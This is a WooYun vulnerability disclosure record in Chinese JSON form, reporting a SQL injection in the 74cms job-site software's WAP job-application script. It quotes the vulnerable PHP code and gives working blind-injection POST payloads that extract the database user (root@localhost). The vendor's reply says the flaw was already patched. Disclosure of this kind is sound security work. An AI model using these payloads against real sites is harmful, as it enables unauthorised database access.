{"id": 48350, "wybug_id": "wooyun-2014-080145", "wybug_title": "74cms SQL注入漏洞", "wybug_corp": "74c,s.com", "wybug_author": "玉林嘎", "wybug_date": "2014-10-20 16:33", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-20：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： 估计有人交了 详细说明：  骑士PHP人才系统：74cms_v3.5.1_20141020.zip之前出的 最新版本 漏洞文件:\\wap\\personal\\wap_apply.php44-69行\nelseif ($act == 'apply_add'){\t$_POST=array_map(\"utf8_to_gbk\", $_POST);\t$sql=\"select * from \".table(\"personal_jobs_apply\").\" where resume_id=$_POST[resume_id] and jobs_id=$_POST[jobs_id]\";\t$row=$db->getone($sql);\tif($_SESSION['utype']!=2){\t\texit(\"个人会员请登录后申请职位\");\t}\telseif($row){\t\texit(\"您已经申请过此职位！\");\t}\telse{\t\t$setsqlarr[\"jobs_id\"]=$_POST[\"jobs_id\"];\t\t$setsqlarr[\"jobs_name\"]=$_POST[\"jobs_name\"];\t\t$setsqlarr[\"company_id\"]=$_POST[\"company_id\"];\t\t$setsqlarr[\"company_name\"]=$_POST[\"company_name\"];\t\t$setsqlarr[\"company_uid\"]=$_POST[\"company_uid\"];\t\t$setsqlarr[\"resume_id\"]=$_POST[\"resume_id\"];\t\t$setsqlarr[\"resume_name\"]=$_POST[\"resume_title\"];\t\t$setsqlarr[\"personal_uid\"]=$_SESSION[\"uid\"];\t\t$setsqlarr[\"apply_addtime\"]=time();\t\tinserttable(table('personal_jobs_apply'),$setsqlarr)?exit(\"ok\"):exit(\"err\");\t}\t}\nresume_id 和jobs_id 2个参数都没进行'保护 遂造成注入   漏洞证明：  先注册个用户http://127.0.0.1/74cms/upload/wap/personal/wap_apply.php?act=apply_addpost:resume_id=1&jobs_id=23 and if(ascii(substr(user(),1,1))=113,1,null)%23\n\npost:resume_id=1&jobs_id=23 and if(ascii(substr(user(),1,1))=114,1,null)%23\n\n显示 您已经申请过此职位！  说明查询成功 user()首位为r\n\n第二位为 o\n\n第三位为 o\n\n第四位为 t最后跑出 user() root@localhost   修复方案：  '保护   版权声明：转载请注明来源 玉林嘎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复： 该漏洞在20号的补丁已经修复过，感谢对骑士的支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}